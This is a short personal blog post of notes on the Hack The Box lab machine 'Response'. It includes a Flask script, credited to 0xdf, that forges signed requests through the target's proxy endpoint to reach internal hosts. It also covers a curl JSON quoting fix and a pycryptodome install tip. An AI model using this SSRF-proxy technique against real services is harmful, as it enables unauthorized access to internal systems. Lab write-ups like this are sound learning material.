+++
author = "Frenchie"
title = "Response HTB"
date = "2023-02-13"
description = "Response HTB"
tags = [
    "Gaming",
    "Hacking",
]
showthedate = false
+++

I can't believe how much pain we must endure to the single or double quotes.

<!--more-->


Raw data from main.js.php
```js
function get_api_status(handle_data, handle_error) {
    url_proxy = 'http://proxy.response.htb/fetch';
    json_body = {'url':'http://api.response.htb/', 'url_digest':'xx', 'method':'GET', 'session':'xx', 'session_digest':'xx'};
    fetch(url_proxy, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(json_body)
...
```

Running `curl --json @jsonfilename http://proxy.response.htb/fetch` return:
```text
<title>400 Bad Request</title>
<h1>Bad Request</h1>
```

I need to search and replace `'` with `"` for the json body.

from:
```text
{'url':'http://api.response.htb/', 'url_digest':'xx', 'method':'GET', 'session':'xx', 'session_digest':'xx'}
```

to:
```text
{"url":"http://api.response.htb/", "url_digest":"xx", "method":"GET", "session":"xx", "session_digest":"xx"}

```
---
## Beautiful Proxy Server Listener from `0xdf`

```python 
from flask import Flask, request, Response
import logging
import requests
import base64
import re

logging.basicConfig(filename="example.log", level=logging.DEBUG)

mimetypes = {"css": "text/css", "js": "text/javascript"}

def get_digest(url):
    main_js = "http://www.response.htb/status/main.js.php"
    cookie = {"PHPSESSID" : url}
    response = requests.get(main_js, cookies = cookie)
    match = re.search(r"'session_digest':'([0-9a-f]*)'};", response.text)
    if not match:
        logging.error('Cannot get url digest')
        return None        
    return match.group(1)

app = Flask(__name__)
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>", methods=["GET", "POST"])
def all(path):
    target = request.url
    body = {
    "url":target,
    "url_digest":get_digest(target),
    "method":request.method,
    "session":"1758934decea994651a63712478da603",
    "session_digest":"a4e0a5f871b17dad46572330edf0d22f48c9fcb804721970f275c1d6855f0d18"
    }
    if request.method == "POST":
        body["body"] = base64.b64encode(request.data).decode()
    response = requests.post("http://proxy.response.htb/fetch", json=body, proxies={"http": "http://127.0.0.1:8080"})
    data = base64.b64decode(response.json()["body"])
    ext = request.path.rsplit(".",1)[-1]
    return Response(data, mimetype=mimetypes.get(ext, "text/html"))



if __name__ == "__main__":
    app.run("", 8001)
```

Noteably, I learnt:
* logging module from ippsec.
* Class request and Response inside flask library from 0xdf.
* json.get(key, defaults) or dict.get(key, defaults).
    * Using get() method with JSON or DICT objects is useful because it allows you to safely retrieve values from an object without the risk of raising a KeyError exception if the key is not found.

---
## pycryptodome
when using `from Crypto.Cipher import AES` DO NOT use `pip uninstall pycryto`, but:
```python
pip install pycryptodome
```
> pycrypto is no longer maintained: see pycrypto.org pycryptodome is the modern maintained replacement for pycrypto

It will spit out error like `PY_SSIZE_T_CLEAN macro must be defined for '#' formats` when running code like `cipher = AES.new(key,AES.MODE_ECB)` in python3.10.

[source](https://stackoverflow.com/questions/70705404/systemerror-py-ssize-t-clean-macro-must-be-defined-for-formats)
